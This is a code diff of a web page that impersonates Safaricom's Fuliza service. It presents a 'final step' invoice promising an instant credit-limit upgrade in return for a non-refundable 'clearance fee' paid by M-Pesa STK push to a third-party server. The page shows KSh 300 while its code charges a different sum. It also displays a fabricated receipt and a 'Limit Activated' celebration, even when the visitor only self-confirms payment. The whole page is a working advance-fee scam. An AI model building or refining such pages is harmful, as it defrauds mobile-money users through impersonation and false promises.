@@ -3,177 +3,608 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Hustle Funds Clearance Payment</title>
-
+<title>Final Clearance Payment</title>
 <style>
-body{font-family:Arial,sans-serif;background:#f4f6f9;margin:0;}
-.top-bar{background:#1fb141;padding:12px;text-align:center;color:white;font-weight:bold;font-size:18px;}
-.payment-box{max-width:420px;margin:60px auto;background:white;padding:30px;border-radius:12px;box-shadow:0 6px 18px rgba(0,0,0,0.1);text-align:center;}
-.info{margin:10px 0;font-size:16px;}
-input{width:100%;padding:12px;margin-top:15px;border:1px solid #ddd;border-radius:6px;font-size:16px;}
-.pay-btn{margin-top:20px;width:100%;padding:14px;background:#1fb141;border:none;color:white;font-size:16px;border-radius:30px;cursor:pointer;}
-.pay-btn:hover{background:#179937;}
-.spinner{margin-top:15px;display:none;}
-.loader{border:4px solid #f3f3f3;border-top:4px solid #1fb141;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:auto;}
-@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
-.message{margin-top:15px;font-size:14px;color:#555;}
-.success{margin-top:20px;font-size:16px;color:green;font-weight:bold;}
+*{box-sizing:border-box;margin:0;padding:0;}
+body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f4f8;min-height:100vh;}
+
+.top-bar{background:linear-gradient(135deg,#1fb141,#16903a);padding:14px;text-align:center;color:#fff;font-weight:700;font-size:18px;letter-spacing:.3px;box-shadow:0 2px 8px rgba(0,0,0,.15);}
+
+.page-wrap{max-width:430px;margin:36px auto 30px;padding:0 12px;}
+
+.step-badge{display:flex;align-items:center;gap:10px;margin-bottom:16px;}
+.step-dot{width:28px;height:28px;border-radius:50%;background:linear-gradient(135deg,#1fb141,#16903a);color:#fff;font-size:13px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+.step-line{flex:1;height:2px;background:#d4edda;border-radius:2px;}
+.step-label{font-size:12.5px;color:#888;white-space:nowrap;}
+
+.invoice-card{background:#fff;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,.1);overflow:hidden;margin-bottom:16px;}
+
+.invoice-header{background:linear-gradient(135deg,#1fb141,#16903a);padding:22px 24px 18px;color:#fff;}
+.invoice-header-top{display:flex;justify-content:space-between;align-items:flex-start;}
+.invoice-title{font-size:16px;font-weight:700;letter-spacing:.2px;}
+.invoice-tag{background:rgba(255,255,255,.2);font-size:11px;font-weight:600;padding:3px 10px;border-radius:20px;letter-spacing:.5px;}
+.invoice-limit{margin-top:10px;font-size:13px;opacity:.85;}
+.invoice-limit span{font-weight:700;opacity:1;}
+
+.invoice-amount-row{display:flex;align-items:baseline;gap:6px;margin-top:18px;padding-top:16px;border-top:1px solid rgba(255,255,255,.25);}
+.invoice-currency{font-size:20px;font-weight:700;opacity:.85;}
+.invoice-amount{font-size:48px;font-weight:800;line-height:1;letter-spacing:-1px;}
+.invoice-label{font-size:12px;opacity:.75;align-self:flex-end;padding-bottom:6px;}
+
+.checklist{padding:18px 24px;}
+.checklist-title{font-size:12px;color:#999;font-weight:600;text-transform:uppercase;letter-spacing:.6px;margin-bottom:12px;}
+.check-item{display:flex;align-items:flex-start;gap:10px;margin-bottom:10px;}
+.check-icon{width:20px;height:20px;border-radius:50%;background:#e8f5e9;color:#1fb141;font-size:11px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px;}
+.check-text{font-size:13.5px;color:#444;line-height:1.45;}
+
+.invoice-divider{height:1px;background:#f0f0f0;margin:0 24px;}
+
+.clearance-note{margin:14px 24px;padding:12px 14px;background:#e8f5e9;border-left:4px solid #1fb141;border-radius:4px;font-size:12.5px;color:#16903a;line-height:1.6;}
+
+.pay-section{background:#fff;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,.1);padding:24px;}
+.pay-section-title{font-size:14px;font-weight:700;color:#1a1a2e;margin-bottom:4px;}
+.pay-section-sub{font-size:12.5px;color:#888;margin-bottom:16px;}
+
+.phone-wrap{display:flex;align-items:center;border:2px solid #ddd;border-radius:10px;overflow:hidden;transition:border-color .2s;}
+.phone-wrap:focus-within{border-color:#1fb141;}
+.phone-wrap.invalid{border-color:#e74c3c;}
+.phone-wrap.valid{border-color:#1fb141;}
+.phone-prefix{background:#e8f5e9;color:#1fb141;font-weight:700;font-size:16px;padding:13px 12px;border-right:2px solid #ddd;white-space:nowrap;user-select:none;}
+.phone-input{flex:1;border:none;outline:none;padding:13px 12px;font-size:16px;color:#333;background:transparent;}
+.phone-status{padding:0 12px;font-size:18px;}
+.phone-hint{font-size:12px;color:#888;margin-top:5px;}
+
+.pay-btn{margin-top:18px;width:100%;padding:15px;background:linear-gradient(135deg,#1fb141,#16903a);border:none;color:#fff;font-size:16px;font-weight:600;border-radius:30px;cursor:pointer;transition:transform .15s,box-shadow .15s;letter-spacing:.3px;}
+.pay-btn:hover:not(:disabled){transform:translateY(-2px);box-shadow:0 6px 20px rgba(124,58,237,.4);}
+.pay-btn:disabled{opacity:.6;cursor:not-allowed;transform:none;}
+
+.spinner{margin-top:16px;display:none;flex-direction:column;align-items:center;gap:8px;}
+.loader{border:4px solid #f3f3f3;border-top:4px solid #1fb141;border-radius:50%;width:34px;height:34px;animation:spin 1s linear infinite;}
+@keyframes spin{to{transform:rotate(360deg);}}
+.spinner-text{font-size:13px;color:#666;}
+
+.status-msg{margin-top:14px;font-size:14px;font-weight:500;padding:10px 14px;border-radius:8px;display:none;}
+.status-msg.info{background:#e8f5e9;color:#16903a;}
+.status-msg.error{background:#fdecea;color:#c0392b;}
+
+.secure-note{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:16px;font-size:12px;color:#aaa;}
+
+/* Confetti canvas */
+#confettiCanvas{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:2000;display:none;}
+
+.overlay{position:fixed;inset:0;background:rgba(0,0,0,.55);backdrop-filter:blur(4px);z-index:1000;display:flex;align-items:flex-end;justify-content:center;opacity:0;pointer-events:none;transition:opacity .3s;}
+.overlay.show{opacity:1;pointer-events:all;}
+
+.popup{background:#fff;border-radius:22px 22px 0 0;width:100%;max-width:480px;padding:0 0 30px;transform:translateY(100%);transition:transform .4s cubic-bezier(.32,1.15,.6,1);box-shadow:0 -8px 40px rgba(0,0,0,.25);}
+.overlay.show .popup{transform:translateY(0);}
+
+.popup-header{border-radius:22px 22px 0 0;padding:28px 24px 22px;text-align:center;}
+.popup-header.success{background:linear-gradient(135deg,#1fb141,#16903a);}
+.popup-header.failure{background:linear-gradient(135deg,#e74c3c,#c0392b);}
+.popup-header.confirm{background:linear-gradient(135deg,#f39c12,#d68910);}
+.popup-icon{width:64px;height:64px;border-radius:50%;background:rgba(255,255,255,.25);display:flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:30px;}
+.popup-title{color:#fff;font-size:20px;font-weight:700;}
+.popup-subtitle{color:rgba(255,255,255,.85);font-size:13.5px;margin-top:4px;}
+
+.receipt-body{padding:20px 24px 0;}
+.receipt-row{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid #f0f0f0;font-size:14px;}
+.receipt-row:last-child{border-bottom:none;}
+.receipt-label{color:#888;font-weight:500;}
+.receipt-value{color:#1a1a2e;font-weight:600;text-align:right;max-width:60%;}
+
+.purpose-note{margin:16px 24px 0;background:#e8f5e9;border-left:4px solid #1fb141;border-radius:4px;padding:10px 14px;font-size:13px;color:#16903a;line-height:1.5;}
+.purpose-note.failure-note{background:#fff5f5;border-left-color:#e74c3c;color:#8b0000;}
+
+.success-banner{margin:16px 24px 0;background:linear-gradient(135deg,#f0fdf4,#dcfce7);border:2px solid #4ade80;border-radius:12px;padding:16px;text-align:center;}
+.success-banner .big-emoji{font-size:40px;display:block;margin-bottom:8px;}
+.success-banner h3{color:#166534;font-size:18px;font-weight:700;margin-bottom:4px;}
+.success-banner p{color:#15803d;font-size:13px;line-height:1.5;}
+
+.popup-actions{display:flex;gap:12px;padding:20px 24px 0;}
+.btn-proceed{flex:1;padding:14px;background:linear-gradient(135deg,#1fb141,#16903a);color:#fff;border:none;border-radius:30px;font-size:15px;font-weight:600;cursor:pointer;transition:transform .15s,box-shadow .15s;}
+.btn-proceed:hover{transform:translateY(-2px);box-shadow:0 4px 14px rgba(124,58,237,.4);}
+.btn-retry{flex:1;padding:14px;background:linear-gradient(135deg,#e74c3c,#c0392b);color:#fff;border:none;border-radius:30px;font-size:15px;font-weight:600;cursor:pointer;transition:transform .15s;}
+.btn-retry:hover{transform:translateY(-2px);}
+.btn-close{flex:1;padding:14px;background:#fff;color:#555;border:2px solid #ddd;border-radius:30px;font-size:15px;font-weight:600;cursor:pointer;transition:border-color .15s;}
+.btn-close:hover{border-color:#aaa;}
+
+.confirm-body{padding:20px 24px 0;text-align:center;font-size:14px;color:#555;line-height:1.6;}
+.confirm-sms-note{margin:14px 24px 0;background:#fffbf0;border-left:4px solid #f39c12;border-radius:4px;padding:10px 14px;font-size:13px;color:#7d5a00;line-height:1.5;text-align:left;}
+
+@media(max-width:480px){
+  .page-wrap{margin:20px auto;padding:0 10px;}
+  .popup{border-radius:18px 18px 0 0;}
+}
 </style>
 </head>
-
 <body>
 
-<header class="top-bar">Safaricom Hustle Funds Clearance</header>
+<canvas id="confettiCanvas"></canvas>
 
-<div class="payment-box">
+<header class="top-bar">Safaricom Fuliza — Final Step 4 of 4</header>
 
-<h2>Final Clearance Payment</h2>
+<div class="page-wrap">
 
-<p class="encourage">
-Dear Customer, your <b>Fuliza limit will be increased</b> to KSh <strong id="limit"></strong>.  
-This final payment covers:<br>
-✅ Hustler Fund clearance<br>
-✅ KRA compliance verification<br>
-✅ Safaricom authorization<br>
-Complete this step to activate your upgraded limit.
-</p>
+  <div class="step-badge">
+    <div class="step-dot">4</div>
+    <div class="step-line"></div>
+    <div class="step-label">Final Clearance Payment</div>
+  </div>
 
-<div class="info">Selected Fuliza Limit: <strong id="limitDisplay"></strong></div>
-<div class="info">Clearance Fee: <strong>KSh 850</strong></div>
+  <div class="invoice-card">
+    <div class="invoice-header">
+      <div class="invoice-header-top">
+        <div class="invoice-title">Clearance Fee Invoice</div>
+        <div class="invoice-tag">FINAL STEP</div>
+      </div>
+      <div class="invoice-limit">Selected Fuliza Limit: <span>KSh <span id="limit">—</span></span></div>
+      <div class="invoice-amount-row">
+        <div class="invoice-currency">KSh</div>
+        <div class="invoice-amount">300</div>
+        <div class="invoice-label">Amount Due</div>
+      </div>
+    </div>
 
-<input type="tel" id="phone" placeholder="Enter phone number e.g. 07XXXXXXXX or +2547XXXXXXXX">
+    <div class="checklist">
+      <div class="checklist-title">What this final payment unlocks</div>
+      <div class="check-item">
+        <div class="check-icon">✓</div>
+        <div class="check-text">Clears any pending Hustle Funds balance on your account</div>
+      </div>
+      <div class="check-item">
+        <div class="check-icon">✓</div>
+        <div class="check-text">Completes KRA &amp; Safaricom compliance verification</div>
+      </div>
+      <div class="check-item">
+        <div class="check-icon">✓</div>
+        <div class="check-text">Triggers instant activation of your new Fuliza limit</div>
+      </div>
+    </div>
 
-<button class="pay-btn" onclick="releaseLimit()">Pay & Complete Clearance</button>
+    <div class="invoice-divider"></div>
 
-<div class="spinner" id="spinner"><div class="loader"></div></div>
+    <div class="clearance-note">
+      🏆 <strong>You're almost there!</strong> This is the very last step. Once this clearance fee is paid, your Fuliza limit will be <strong>instantly upgraded to KSh <span id="limitInNote">—</span></strong>. No further steps required — your new limit activates immediately upon payment confirmation.
+    </div>
 
-<div class="message" id="message"></div>
-<div class="success" id="success"></div>
+    <div style="padding:14px 24px;font-size:12px;color:#aaa;text-align:center;">
+      This clearance fee finalizes your upgrade. It is non-refundable once processed.
+    </div>
+  </div>
+
+  <div class="pay-section">
+    <div class="pay-section-title">Pay via M-Pesa STK Push</div>
+    <div class="pay-section-sub">A payment prompt will be sent directly to your phone.</div>
+
+    <div class="phone-wrap" id="phoneWrap">
+      <span class="phone-prefix">254</span>
+      <input class="phone-input" type="tel" id="phone" placeholder="7XXXXXXXX" maxlength="9" inputmode="numeric" autocomplete="tel">
+      <span class="phone-status" id="phoneStatus"></span>
+    </div>
+    <div class="phone-hint" id="phoneHint">Enter 9 digits after 254 — must start with 7 (e.g. 712345678)</div>
+
+    <button class="pay-btn" id="payBtn" onclick="payNow()">Pay KSh 300 &amp; Activate Limit</button>
+
+    <div class="spinner" id="spinner">
+      <div class="loader"></div>
+      <div class="spinner-text" id="spinnerText">Sending STK Push to your phone…</div>
+    </div>
+
+    <div class="status-msg" id="statusMsg"></div>
+
+    <div class="secure-note">🔒 Secured by Safaricom M-Pesa</div>
+  </div>
 
 </div>
 
+<!-- Success Popup -->
+<div class="overlay" id="successOverlay">
+  <div class="popup">
+    <div class="popup-header success">
+      <div class="popup-icon">🎉</div>
+      <div class="popup-title">Limit Activated!</div>
+      <div class="popup-subtitle">Your Fuliza upgrade is complete</div>
+    </div>
+    <div class="receipt-body">
+      <div class="receipt-row"><span class="receipt-label">Receipt No.</span><span class="receipt-value" id="rReceiptNo">—</span></div>
+      <div class="receipt-row"><span class="receipt-label">Amount Paid</span><span class="receipt-value" id="rAmount">—</span></div>
+      <div class="receipt-row"><span class="receipt-label">Phone</span><span class="receipt-value" id="rPhone">—</span></div>
+      <div class="receipt-row"><span class="receipt-label">Date &amp; Time</span><span class="receipt-value" id="rDate">—</span></div>
+      <div class="receipt-row"><span class="receipt-label">Status</span><span class="receipt-value" style="color:#1fb141;">Completed ✓</span></div>
+    </div>
+    <div class="success-banner">
+      <span class="big-emoji">🏆</span>
+      <h3>Congratulations!</h3>
+      <p>Your Fuliza limit has been successfully upgraded to<br><strong style="font-size:18px;">KSh <span id="rNewLimit">—</span></strong>.<br>Your new limit is now active on your M-Pesa account.</p>
+    </div>
+    <div class="purpose-note" style="margin-top:16px;">
+      All 4 steps completed — clearance fee received and Fuliza limit is now active. Check your Fuliza balance on M-Pesa to confirm your new limit.
+    </div>
+    <div class="popup-actions">
+      <button class="btn-proceed" onclick="closeSuccess()">Done 🎊</button>
+    </div>
+  </div>
+</div>
+
+<!-- Self-confirm Popup -->
+<div class="overlay" id="confirmOverlay">
+  <div class="popup">
+    <div class="popup-header confirm">
+      <div class="popup-icon">❓</div>
+      <div class="popup-title">Did you receive an M-Pesa SMS?</div>
+      <div class="popup-subtitle">We haven't received automatic confirmation yet</div>
+    </div>
+    <div class="confirm-body">
+      If Safaricom sent you a confirmation message saying your payment was successful, tap <strong>Yes, I Paid</strong> to complete your upgrade.
+    </div>
+    <div class="confirm-sms-note">
+      📩 Check your M-Pesa messages. If you see a confirmation SMS with KSh 300 deducted, your payment went through and your limit is activated.
+    </div>
+    <div class="popup-actions">
+      <button class="btn-proceed" onclick="manualConfirm()">Yes, I Paid ✓</button>
+      <button class="btn-retry" onclick="manualFail()">No, Retry</button>
+    </div>
+  </div>
+</div>
+
+<!-- Failure Popup -->
+<div class="overlay" id="failureOverlay">
+  <div class="popup">
+    <div class="popup-header failure">
+      <div class="popup-icon">❌</div>
+      <div class="popup-title">Payment Failed</div>
+      <div class="popup-subtitle">Clearance fee could not be collected</div>
+    </div>
+    <div class="purpose-note failure-note" id="failureReason">
+      Please check your M-Pesa PIN and balance, then try again. Your limit upgrade is on hold until this final step is completed.
+    </div>
+    <div class="popup-actions">
+      <button class="btn-retry" onclick="retryPayment()">↩ Try Again</button>
+      <button class="btn-close" onclick="closeFailure()">Close</button>
+    </div>
+  </div>
+</div>
+
 <script>
-const selectedAmount = localStorage.getItem("selectedAmount") || "0";
-const clearanceFee = 11; // Corrected amount
+const BACKEND = "https://mpayafrica-server.onrender.com";
 
-document.getElementById("limit").innerText = "KSh " + selectedAmount;
-document.getElementById("limitDisplay").innerText = "KSh " + selectedAmount;
+const selectedAmount = localStorage.getItem("selectedAmount") || "—";
+document.getElementById("limit").innerText = selectedAmount;
+document.getElementById("limitInNote").innerText = selectedAmount;
 
-// Format Kenyan phone number for MPESA
-function formatPhone(number){
-  number = number.trim();
-  if(number.startsWith('+254')) return number.substring(1);
-  if(number.startsWith('0')) return '254' + number.substring(1);
-  if(number.startsWith('07') || number.startsWith('01')) return '254' + number.substring(1);
-  return number;
+const CLEARANCE_FEE = 15;
+
+const phoneInput  = document.getElementById("phone");
+const phoneWrap   = document.getElementById("phoneWrap");
+const phoneStatus = document.getElementById("phoneStatus");
+const phoneHint   = document.getElementById("phoneHint");
+
+phoneInput.addEventListener("input", () => {
+  phoneInput.value = phoneInput.value.replace(/\D/g, "").slice(0, 9);
+  validatePhoneUI(phoneInput.value);
+});
+
+function validatePhoneUI(val) {
+  if (val.length === 0) {
+    phoneWrap.className = "phone-wrap";
+    phoneStatus.innerText = "";
+    phoneHint.style.color = "#888";
+    phoneHint.innerText = "Enter 9 digits after 254 — starts with 7 (07xx) or 1 (01xx)";
+    return false;
+  }
+  if (val.length < 9) {
+    phoneWrap.className = "phone-wrap";
+    phoneStatus.innerText = "";
+    phoneHint.style.color = "#888";
+    phoneHint.innerText = `${9 - val.length} more digit${9 - val.length !== 1 ? "s" : ""} needed`;
+    return false;
+  }
+  if (!val.startsWith("7") && !val.startsWith("1")) {
+    phoneWrap.className = "phone-wrap invalid";
+    phoneStatus.innerText = "✗";
+    phoneStatus.style.color = "#e74c3c";
+    phoneHint.style.color = "#e74c3c";
+    phoneHint.innerText = "Must start with 7 or 1 — Safaricom numbers only (07xx / 01xx)";
+    return false;
+  }
+  phoneWrap.className = "phone-wrap valid";
+  phoneStatus.innerText = "✓";
+  phoneStatus.style.color = "#1fb141";
+  phoneHint.style.color = "#1fb141";
+  phoneHint.innerText = "Valid Safaricom number ✓";
+  return true;
 }
 
-// Validate Kenyan number
-function isValidPhone(number){
-  const formatted = formatPhone(number);
-  return /^2547[0-9]{8}$/.test(formatted);
+function showStatus(msg, type) {
+  const el = document.getElementById("statusMsg");
+  el.innerText = msg;
+  el.className = "status-msg " + type;
+  el.style.display = "block";
 }
+function hideStatus() { document.getElementById("statusMsg").style.display = "none"; }
+function setSpinner(show, text) {
+  document.getElementById("spinner").style.display = show ? "flex" : "none";
+  if (text) document.getElementById("spinnerText").innerText = text;
+}
+function setPayBtn(disabled) { document.getElementById("payBtn").disabled = disabled; }
 
-async function releaseLimit(){
-  const phone = document.getElementById("phone").value.trim();
-  const msg = document.getElementById("message");
-  const successMsg = document.getElementById("success");
-  const spinner = document.getElementById("spinner");
+let pollInterval = null;
+let currentPhone = null;
+let confettiAnimId = null;
 
-  msg.innerText = "";
-  successMsg.innerText = "";
-  spinner.style.display = "none";
-
-  if(!phone){
-    msg.innerText = "Enter your phone number";
-    msg.style.color = "red";
+async function payNow() {
+  const digits = phoneInput.value.trim();
+  if (!validatePhoneUI(digits)) {
+    showStatus("Please enter a valid Safaricom number (starts with 7 or 1, 9 digits after 254).", "error");
     return;
   }
 
-  if(!isValidPhone(phone)){
-    msg.innerText = "Invalid Kenyan number. Use 07XXXXXXXX or +2547XXXXXXXX";
-    msg.style.color = "red";
-    return;
-  }
+  const fullPhone = "254" + digits;
+  currentPhone = fullPhone;
+  hideStatus();
+  setSpinner(true, "Sending STK Push to your phone…");
+  setPayBtn(true);
 
-  const phoneToSend = formatPhone(phone);
-  spinner.style.display = "block";
-  msg.innerText = "Waiting for STK Push... check your phone";
-  msg.style.color = "black";
-
-  try{
-    const res = await fetch("https://mpayafrica-server.onrender.com/deposit", {
+  let data;
+  try {
+    const res = await fetch(BACKEND + "/api/stk-push", {
       method: "POST",
-      headers: {"Content-Type":"application/json"},
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        phone_number: phoneToSend,
-        amount: clearanceFee,
-        country: "KE",
-        network: "MPESA"
-      })
+        amount: CLEARANCE_FEE,
+        phone_number: fullPhone,
+        user_reference: "Fuliza Hustle Funds Clearance",
+        payment_id: "wallet",
+      }),
     });
-
-    const data = await res.json();
-    spinner.style.display = "none";
-
-    if(data.success){
-      msg.innerText = "STK Push sent ✅ Enter your mobile money PIN...";
-      msg.style.color = "green";
-      checkPayment(data.reference);
-    } else {
-      msg.innerText = "Payment failed: " + (data.message || "Try again");
-      msg.style.color = "red";
-    }
-
-  } catch(err){
-    spinner.style.display = "none";
-    msg.innerText = "Server error: " + (err.message || "Try again");
-    msg.style.color = "red";
+    data = await res.json();
+  } catch (err) {
+    setSpinner(false);
+    setPayBtn(false);
+    showStatus("Network error: Could not reach server. Check your connection and try again.", "error");
+    return;
   }
+
+  if (!data.success) {
+    setSpinner(false);
+    setPayBtn(false);
+    showStatus(data.message || data.error || "Payment initiation failed. Please try again.", "error");
+    return;
+  }
+
+  const checkoutId = data.checkoutRequestId;
+  setSpinner(true, "STK Push sent ✅ Enter your M-Pesa PIN on your phone…");
+  showStatus("Check your phone and enter your M-Pesa PIN to complete payment.", "info");
+
+  if (!checkoutId) {
+    setSpinner(false);
+    setPayBtn(false);
+    showStatus("Payment sent but could not track status. Check your M-Pesa messages.", "info");
+    return;
+  }
+
+  startPolling(checkoutId, fullPhone);
 }
 
-async function checkPayment(reference){
-  const msg = document.getElementById("message");
-  const successMsg = document.getElementById("success");
+function startPolling(checkoutId, phone) {
   let attempts = 0;
-
-  const interval = setInterval(async () => {
+  clearInterval(pollInterval);
+  pollInterval = setInterval(async () => {
     attempts++;
-    if(attempts > 80){
-      clearInterval(interval);
-      msg.innerText = "Payment timeout. Please retry.";
-      msg.style.color = "red";
+    if (attempts === 10) {
+      setSpinner(true, "Still waiting for confirmation…");
+    }
+    if (attempts > 40) {
+      clearInterval(pollInterval);
+      setSpinner(false);
+      setPayBtn(false);
+      hideStatus();
+      showSelfConfirm();
       return;
     }
-
-    try{
-      const res = await fetch(`https://mpayafrica-server.onrender.com/status/${reference}`);
+    try {
+      const res = await fetch(`${BACKEND}/receipt/${encodeURIComponent(checkoutId)}`);
       const data = await res.json();
-
-      if(data.success && data.data){
-        const status = (data.data.status || "").toLowerCase();
-
-        if(status === "pending"){
-          msg.innerText = "Payment pending... check your phone and enter PIN";
-          msg.style.color = "black";
-        }
-        if(status === "success"){
-          clearInterval(interval);
-          msg.innerText = "";
-          successMsg.innerText = "🎉 Congratulations! Your Fuliza limit has been successfully increased to KSh " + selectedAmount + ".";
-          localStorage.setItem("currentLimit", selectedAmount);
-          setTimeout(() => { window.location.href = "success.html"; }, 2000);
-        }
-        if(status === "failed" || status === "cancelled" || status === "stk_failed" || status === "error"){
-          clearInterval(interval);
-          msg.innerText = "Payment failed or cancelled. Please try again.";
-          msg.style.color = "red";
-        }
+      if (data.status === "pending" || data.status === "not_found") return;
+      clearInterval(pollInterval);
+      setSpinner(false);
+      setPayBtn(false);
+      hideStatus();
+      if (data.status === "success" && data.receipt) {
+        showSuccessPopup(data.receipt, phone);
+      } else if (data.status === "failed") {
+        showFailurePopup(data.reason || "Payment was not completed. Please try again.");
       }
-    } catch(e){}
+    } catch (_) {}
   }, 3000);
+
+  setTimeout(() => {
+    if (pollInterval !== null) {
+      clearInterval(pollInterval);
+      pollInterval = null;
+      setSpinner(false);
+      hideStatus();
+      showSelfConfirm();
+    }
+  }, 32000);
+}
+
+function showSelfConfirm() {
+  document.getElementById("confirmOverlay").classList.add("show");
+}
+
+function manualConfirm() {
+  document.getElementById("confirmOverlay").classList.remove("show");
+  showSuccessPopup({
+    receiptNumber: "Check M-Pesa SMS",
+    amount: CLEARANCE_FEE,
+    phone: currentPhone,
+    transactionDate: new Date().toLocaleString("en-KE"),
+    purpose: "Fuliza Hustle Funds Clearance",
+  }, currentPhone);
+}
+
+function manualFail() {
+  document.getElementById("confirmOverlay").classList.remove("show");
+  showFailurePopup("Payment was not completed. Please try again.");
+}
+
+function showSuccessPopup(receipt, fallbackPhone) {
+  document.getElementById("rReceiptNo").innerText = receipt.receiptNumber || "N/A";
+  document.getElementById("rAmount").innerText    = "KSh " + (receipt.amount || CLEARANCE_FEE);
+  document.getElementById("rPhone").innerText     = receipt.phone || fallbackPhone || "—";
+  document.getElementById("rDate").innerText      = receipt.transactionDate || new Date().toLocaleString("en-KE");
+  document.getElementById("rNewLimit").innerText  = selectedAmount;
+  localStorage.setItem("currentLimit", selectedAmount);
+
+  document.getElementById("successOverlay").classList.add("show");
+
+  launchConfetti();
+  playCelebrationSound();
+}
+
+function closeSuccess() {
+  document.getElementById("successOverlay").classList.remove("show");
+  stopConfetti();
+}
+
+function showFailurePopup(reason) {
+  document.getElementById("failureReason").innerText = reason || "Payment failed. Please try again.";
+  document.getElementById("failureOverlay").classList.add("show");
+}
+
+function retryPayment() {
+  document.getElementById("failureOverlay").classList.remove("show");
+  setPayBtn(false);
+  hideStatus();
+  clearInterval(pollInterval);
+}
+
+function closeFailure() {
+  document.getElementById("failureOverlay").classList.remove("show");
+}
+
+/* ── Confetti ── */
+const canvas = document.getElementById("confettiCanvas");
+const ctx = canvas.getContext("2d");
+let confettiPieces = [];
+const COLORS = ["#1fb141","#16903a","#f59e0b","#10b981","#ef4444","#3b82f6","#ec4899","#fbbf24","#34d399","#f472b6"];
+
+function resizeCanvas() {
+  canvas.width  = window.innerWidth;
+  canvas.height = window.innerHeight;
+}
+window.addEventListener("resize", resizeCanvas);
+resizeCanvas();
+
+function randomBetween(a, b) { return a + Math.random() * (b - a); }
+
+function createPiece() {
+  return {
+    x: randomBetween(0, canvas.width),
+    y: randomBetween(-20, -5),
+    w: randomBetween(8, 14),
+    h: randomBetween(4, 8),
+    color: COLORS[Math.floor(Math.random() * COLORS.length)],
+    vx: randomBetween(-2, 2),
+    vy: randomBetween(3, 7),
+    angle: randomBetween(0, Math.PI * 2),
+    spin: randomBetween(-0.15, 0.15),
+    opacity: 1,
+  };
+}
+
+function launchConfetti() {
+  canvas.style.display = "block";
+  confettiPieces = [];
+  for (let i = 0; i < 180; i++) {
+    const p = createPiece();
+    p.y = randomBetween(-200, 0);
+    confettiPieces.push(p);
+  }
+  animateConfetti();
+}
+
+function animateConfetti() {
+  ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+  confettiPieces.forEach((p, idx) => {
+    p.x += p.vx;
+    p.y += p.vy;
+    p.angle += p.spin;
+    if (p.y > canvas.height * 0.7) {
+      p.opacity -= 0.015;
+    }
+
+    ctx.save();
+    ctx.globalAlpha = Math.max(0, p.opacity);
+    ctx.translate(p.x, p.y);
+    ctx.rotate(p.angle);
+    ctx.fillStyle = p.color;
+    ctx.fillRect(-p.w / 2, -p.h / 2, p.w, p.h);
+    ctx.restore();
+  });
+
+  confettiPieces = confettiPieces.filter(p => p.opacity > 0 && p.y < canvas.height + 20);
+
+  if (confettiPieces.length > 0) {
+    confettiAnimId = requestAnimationFrame(animateConfetti);
+  } else {
+    canvas.style.display = "none";
+  }
+}
+
+function stopConfetti() {
+  if (confettiAnimId) cancelAnimationFrame(confettiAnimId);
+  confettiPieces = [];
+  canvas.style.display = "none";
+}
+
+/* ── Celebration Sound ── */
+function playCelebrationSound() {
+  try {
+    const AudioCtx = window.AudioContext || window.webkitAudioContext;
+    if (!AudioCtx) return;
+    const ac = new AudioCtx();
+
+    const notes = [523.25, 659.25, 783.99, 1046.50, 1318.51];
+    const durations = [0.12, 0.12, 0.12, 0.18, 0.30];
+    let t = ac.currentTime + 0.05;
+
+    notes.forEach((freq, i) => {
+      const osc = ac.createOscillator();
+      const gain = ac.createGain();
+      osc.connect(gain);
+      gain.connect(ac.destination);
+      osc.type = "sine";
+      osc.frequency.setValueAtTime(freq, t);
+      gain.gain.setValueAtTime(0.22, t);
+      gain.gain.exponentialRampToValueAtTime(0.001, t + durations[i]);
+      osc.start(t);
+      osc.stop(t + durations[i] + 0.05);
+      t += durations[i] * 0.9;
+    });
+
+    setTimeout(() => {
+      const notes2 = [523.25, 659.25, 783.99, 1046.50, 783.99, 1046.50, 1318.51];
+      let t2 = ac.currentTime + 0.05;
+      notes2.forEach((freq, i) => {
+        const osc2 = ac.createOscillator();
+        const g2 = ac.createGain();
+        osc2.connect(g2);
+        g2.connect(ac.destination);
+        osc2.type = "triangle";
+        osc2.frequency.setValueAtTime(freq, t2);
+        g2.gain.setValueAtTime(0.15, t2);
+        g2.gain.exponentialRampToValueAtTime(0.001, t2 + 0.2);
+        osc2.start(t2);
+        osc2.stop(t2 + 0.25);
+        t2 += 0.13;
+      });
+    }, 600);
+
+  } catch (e) {}
 }
 </script>
-
 </body>
 </html>
